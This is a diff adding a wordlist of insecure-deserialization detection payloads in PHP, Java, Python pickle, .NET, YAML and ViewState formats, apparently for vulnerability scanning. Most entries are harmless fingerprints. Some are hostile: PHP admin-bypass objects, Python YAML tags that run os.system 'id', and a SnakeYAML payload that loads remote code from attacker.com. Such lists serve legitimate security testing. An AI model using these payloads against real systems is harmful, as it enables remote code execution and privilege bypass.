@@ -1,0 +1,110 @@
+# Insecure Deserialization - Detection Payloads
+# Used for identifying deserialization vulnerabilities
+# Contains fingerprinting payloads for various formats
+
+# ====================================
+# PHP Serialized Objects
+# ====================================
+
+# Basic PHP objects
+O:8:"stdClass":0:{}
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+a:1:{s:4:"test";s:4:"test";}
+a:2:{i:0;s:4:"test";i:1;s:4:"test";}
+
+# Type juggling
+b:1;
+b:0;
+i:1;
+i:0;
+N;
+s:4:"test";
+
+# Admin bypass attempts
+a:1:{s:4:"user";s:5:"admin";}
+a:1:{s:4:"role";s:5:"admin";}
+a:1:{s:8:"is_admin";b:1;}
+O:4:"User":1:{s:8:"username";s:5:"admin";}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
+
+# Nested objects
+a:1:{s:4:"data";O:8:"stdClass":0:{};}
+O:8:"stdClass":1:{s:4:"data";a:1:{i:0;s:4:"test";}}
+
+# Magic method triggers
+O:7:"SplHeap":0:{}
+O:11:"ArrayObject":0:{}
+O:16:"SplObjectStorage":0:{}
+
+# Common framework gadgets (detection only)
+O:21:"JDatabaseDriverMysqli":0:{}
+O:32:"Monolog\\Handler\\SyslogUdpHandler":0:{}
+O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}
+O:29:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":0:{}
+
+# ====================================
+# Java Serialized Objects (Base64)
+# ====================================
+
+# Minimal Java String (base64 of aced0005...)
+rO0ABXQABHRlc3Q=
+
+# Java HashMap
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4
+
+# Java ArrayList
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAEdGVzdHg=
+
+# ====================================
+# Python Pickle (Base64)
+# ====================================
+
+# Protocol 0 - String
+KFMndGVzdCcKcDAKLg==
+
+# Protocol 2 - String
+gAJYBAAAAHRlc3RxAC4=
+
+# Protocol 3 - String
+gANYBAAAAHRlc3RxAC4=
+
+# Protocol 4 - String
+gASVCgAAAAAAAABYBAAAAHRlc3SUNC4=
+
+# ====================================
+# .NET BinaryFormatter (Base64)
+# ====================================
+
+# Minimal .NET String
+AAEAAAD/////AQAAAAAAAAAEAQAAAA5TeXN0ZW0uU3RyaW5nAQAAAAVtX3ZhbHVlBQAAAAR0ZXN0Cw==
+
+# ====================================
+# YAML Dangerous Tags
+# ====================================
+
+# Python YAML
+!!python/object/apply:os.system ['id']
+!!python/object/new:subprocess.check_output [['id']]
+!!python/object:__main__.MyClass {}
+
+# Ruby YAML
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? |
+  test
+: !ruby/struct
+  foo: bar
+
+# Java SnakeYAML
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com"]]]]
+
+# ====================================
+# ViewState (.NET)
+# ====================================
+
+# Minimal ViewState
+/wEPDwUJMTIzNDU2Nzg5ZGQ=
+/wEYDwUJMTIzNDU2Nzg5ZGQ=
